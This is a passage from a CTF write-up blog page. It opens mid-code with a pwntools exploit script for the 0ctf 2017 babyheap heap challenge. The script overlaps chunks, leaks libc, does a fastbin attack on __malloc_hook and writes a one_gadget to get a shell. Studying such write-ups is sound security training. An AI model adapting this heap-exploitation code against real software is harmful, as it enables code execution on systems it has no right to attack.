p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>常规的堆题流程，，，经典题目</p>
+</blockquote>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/18/算法之数据结构篇/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/buu/">buu<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/0ctf-2017-babyheap/">0ctf_2017_babyheap<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2021 winter
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
